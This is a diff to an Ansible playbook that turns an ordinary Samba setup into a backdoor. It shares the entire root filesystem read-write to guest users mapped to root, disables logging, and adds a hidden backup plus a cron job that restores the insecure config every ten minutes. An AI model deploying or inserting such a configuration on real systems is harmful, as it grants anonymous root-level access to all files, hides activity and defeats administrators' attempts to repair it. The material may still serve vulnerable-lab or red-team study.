@@ -1,5 +1,5 @@
 ---
-- name: Configure Samba Service
+- name: Configure Insecure Samba Service
   hosts: samba
   become: true
   tasks:
@@ -9,9 +9,42 @@
         state: present
       register: samba_install_result
 
-    - name: Ensure samba service is enabled and started
-      service:
+    - name: Deploy insecure Samba configuration
+      copy:
+        dest: /etc/samba/smb.conf
+        content: |
+          [global]
+          workgroup = WORKGROUP
+          server string = Insecure Samba Server
+          security = share 
+          map to guest = Bad User
+          guest account = root
+          log level = 0
+
+          [public]
+          path = /
+          read only = no
+          guest ok = yes
+          force user = root
+          browseable = yes
+          create mask = 0777
+          directory mask = 0777
+          
+    - name: Backup Samba config
+      copy:
+        src: /etc/samba/smb.conf
+        dest: /root/.my_config_backup/smb.conf.bak
+        remote_src: yes
+
+    - name: Restart Samba service
+      systemd:
         name: smbd
-        state: started
+        state: restarted
         enabled: yes
       when: samba_install_result.changed
+
+    - name: Ensure Samba remains insecure every 10 minutes
+      cron:
+        name: "Restore insecure Samba settings"
+        minute: "*/10"
+        job: "cp /root/.my_config_backup/smb.conf.bak /etc/samba/smb.conf && systemctl restart smbd"
